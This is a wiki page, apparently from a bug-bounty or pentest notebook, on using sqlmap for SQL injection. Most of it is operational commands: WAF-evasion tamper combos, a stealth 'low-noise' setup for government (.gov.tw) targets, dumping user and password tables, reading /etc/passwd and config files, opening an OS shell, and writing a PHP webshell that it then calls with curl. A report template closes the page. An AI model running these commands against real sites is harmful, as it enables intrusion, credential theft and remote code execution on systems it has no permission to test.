---
type: wiki
category: tool
tool: sqlmap
status: active
last-updated: 2026-04-21
source: https://github.com/sqlmapproject/sqlmap
---

# Tool: sqlmap (SQL Injection Automation)

> **Purpose:** The most powerful SQL Injection automation tool. Supports error-based / boolean-based / time-based / UNION / stacked / out-of-band.
> Can enumerate DB / tables / columns / data + write shells (depending on DBMS privileges).

## Installation

```bash
# Official
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git ~/sqlmap
alias sqlmap='python3 ~/sqlmap/sqlmap.py'

# brew
brew install sqlmap

# Check version
sqlmap --version
```

## Basic usage

```bash
# GET parameter
sqlmap -u "https://target.com/page.php?id=1" --batch

# POST parameter
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --batch

# From a Burp-saved request file
sqlmap -r req.txt --batch

# Specify which param to test
sqlmap -u "https://target/page.php?id=1&cat=all" -p id --batch

# Specify DB type (speeds things up)
sqlmap -u "https://target/page.php?id=1" --dbms=mysql --batch
```

## Essential flags

| Flag | Purpose |
|------|------|
| `-u URL` | GET URL |
| `--data='a=b'` | POST data |
| `-r req.txt` | Burp raw request |
| `-p param` | Test only the specified param |
| `--dbms=mysql` | Specify DB (speeds up testing) |
| `--level 3` | Test depth (1-5, default 1) |
| `--risk 2` | Risk level (1-3, default 1) |
| `--technique=BEUSTQ` | B=Boolean E=Error U=Union S=Stacked T=Time Q=Query |
| `--batch` | Auto-answer yes to all prompts |
| `--random-agent` | Random UA |
| `--proxy http://127.0.0.1:8080` | Burp proxy |
| `--tamper=script1,script2` | WAF bypass |
| `--delay 3` | Delay between requests |
| `--timeout 30` | Timeout |
| `--retries 2` | Retry on failure |
| `--threads 5` | Parallelism |
| `-v 1` | Verbose level |

## Data extraction flags

| Flag | Purpose |
|------|------|
| `--current-user` | Current DB user |
| `--current-db` | Current DB |
| `--is-dba` | Whether user is DBA |
| `--privileges` | Current user's privileges |
| `--dbs` | List all DBs |
| `--tables -D dbname` | List all tables in a DB |
| `--columns -T table -D db` | List columns |
| `--dump -T table -D db` | Dump the entire table |
| `--dump-all` | Dump everything (use with caution) |
| `--count -D db` | Row count per table |
| `--schema` | DB schema |
| `--search -C password` | Find tables with a "password" column |
| `--sql-shell` | Enter SQL shell |
| `--os-shell` | Try to get an OS shell (requires high privileges)|
| `--file-read=/etc/passwd` | Read a file |
| `--file-write=local.txt --file-dest=/var/www/uploaded.txt` | Write a file |

## Recommended combos

### 1. Quick confirmation of SQLi presence

```bash
sqlmap -u "https://target.com/page.php?id=1" \
  --batch \
  --level 2 \
  --risk 1 \
  --random-agent
```

### 2. Deep testing (after confirming the vuln)

```bash
sqlmap -u "https://target.com/page.php?id=1" \
  --batch \
  --level 5 \
  --risk 3 \
  --technique=BEUST \
  --random-agent
```

### 3. Grab DB schema

```bash
# List DBs
sqlmap -u "https://target/page.php?id=1" --dbs --batch

# Find password columns
sqlmap -u "https://target/page.php?id=1" --search -C password,token,secret --batch

# Dump the users table
sqlmap -u "https://target/page.php?id=1" -D target_db -T users --dump --batch
```

### 4. WAF bypass (sqlmap tamper)

```bash
# MySQL
sqlmap -u "https://target/page.php?id=1" \
  --tamper=between,randomcase,space2comment,charencode \
  --random-agent \
  --delay 3 \
  --batch

# MSSQL
sqlmap -u "https://target/page.php?id=1" \
  --tamper=between,randomcase,space2mssqlblank,equaltolike \
  --batch

# Very aggressive (for stubborn WAFs)
sqlmap -u "https://target/page.php?id=1" \
  --tamper=between,randomcase,space2plus,charunicodeencode,versionedmorekeywords \
  --delay 5 \
  --threads 1 \
  --batch
```

### 5. Time-based blind (when there's no error message)

```bash
sqlmap -u "https://target/page.php?id=1" \
  --technique=T \
  --time-sec 5 \
  --batch
```

### 6. Send via Burp Repeater

```bash
# 1. In Burp, right-click the request → Copy to file → req.txt
# 2. sqlmap reads it:
sqlmap -r req.txt --batch --random-agent
```

### 7. POST JSON injection

```bash
# SQLi in a JSON body
sqlmap -u "https://target/api/login" \
  --data='{"username":"admin","password":"test*"}' \
  --headers="Content-Type: application/json" \
  --batch

# * marks the param position to test
```

## Tamper scripts (WAF bypass)

Commonly used:

| Tamper | Purpose |
|--------|------|
| `between` | Replace `=` with `BETWEEN` |
| `randomcase` | Randomize keyword casing |
| `space2comment` | Space → `/**/` |
| `space2plus` | Space → `+` |
| `space2mysqlblank` | Space → `%0B` `%0C` |
| `space2mssqlblank` | MSSQL variant |
| `charencode` | URL-encode special characters |
| `charunicodeencode` | Unicode encode |
| `versionedmorekeywords` | MySQL `/*!50000... */` |
| `versionedkeywords` | MySQL `/*!...*/` |
| `apostrophenullencode` | `'` → `%00%27` |
| `equaltolike` | `=` → `LIKE` |

List them all:
```bash
sqlmap --list-tampers
```

## Low-noise mode for government targets

```bash
sqlmap -u "https://target.gov.tw/page.php?id=1" \
  --batch \
  --random-agent \
  --delay 5 \
  --timeout 30 \
  --retries 1 \
  --threads 1 \
  --level 2 \
  --risk 1 \
  --tamper=between,randomcase \
  -v 1
```

## Post-exploitation

### 1. SQL shell

```bash
sqlmap -u target --sql-shell --batch

sql-shell> SELECT @@version;
sql-shell> SELECT * FROM users WHERE username='admin';
sql-shell> SELECT load_file('/etc/passwd');  -- MySQL
```

### 2. OS shell (requires DBA)

```bash
sqlmap -u target --os-shell --batch

os-shell> id
os-shell> whoami
os-shell> cat /etc/passwd
```

### 3. Read files

```bash
sqlmap -u target --file-read=/etc/passwd --batch
sqlmap -u target --file-read=/var/www/html/config.php --batch
```

### 4. Write files (webshell)

```bash
# First write a shell
echo '<?php system($_GET["c"]); ?>' > shell.php

# Upload it
sqlmap -u target \
  --file-write=shell.php \
  --file-dest=/var/www/html/uploads/shell.php \
  --batch

# Verify
curl "https://target/uploads/shell.php?c=id"
```

## Saving test time

### 1. Use `--batch` to skip all prompts

### 2. Use `--flush-session` to avoid stale data interference

```bash
sqlmap -u target --flush-session --batch
```

### 3. Use `--level` and `--risk` to control depth

- `level 1 risk 1` — fastest, roughly 10 payloads
- `level 3 risk 2` — common balance
- `level 5 risk 3` — most thorough but slow

### 4. Specify DBMS

```bash
# If you know it's MySQL, add this
sqlmap -u target --dbms=mysql --batch
```

### 5. Restrict with `--technique`

```bash
# Only try error + union (fast)
sqlmap -u target --technique=EU --batch

# Only try time-based (slow but stealthy)
sqlmap -u target --technique=T --batch
```

## Batch-scanning results from gf sqli

```bash
# After gf classification
gf sqli < endpoints.txt > gf_sqli.txt

# Batch run
while read -r url; do
  echo "=== $url ==="
  sqlmap -u "$url" --batch --level 1 --risk 1 --random-agent --technique=BE 2>&1 | \
    grep -E "Type:|Payload:|injectable"
done < gf_sqli.txt
```

## Report writeup

```markdown
## Vulnerability Overview
https://target.gov.tw/search.php?q=test has a boolean-based SQLi.

## Reproduction Steps
```bash
sqlmap -u "https://target.gov.tw/search.php?q=test" \
  --batch --level 3 --risk 2 --technique=B --random-agent

# Output:
# Parameter: q (GET)
# Type: boolean-based blind
# Title: AND boolean-based blind - WHERE or HAVING clause
# Payload: q=test' AND 1=1 AND '1'='1
```

## PoC (manual)
```bash
# Baseline
curl -s "https://target.gov.tw/search.php?q=test" | wc -c
# 12345

# True condition
curl -s "https://target.gov.tw/search.php?q=test' AND 1=1--" | wc -c
# 12345

# False condition
curl -s "https://target.gov.tw/search.php?q=test' AND 1=2--" | wc -c
# 9876
```

## Impact
- DB name: `xxx` (verified via `--current-db`)
- DB user privileges: `SELECT` (not DBA, cannot write files)
- 142 readable tables
- The `users` table contains a plaintext password column (`password`)

## Severity
P1-CRIT (PII dump possible)
```

## Related documents

- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) §sqlmap tamper
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) §SQLi
- [13-hunter-crawl-chain.md](13-hunter-crawl-chain.md) — gf sqli produces the URL list
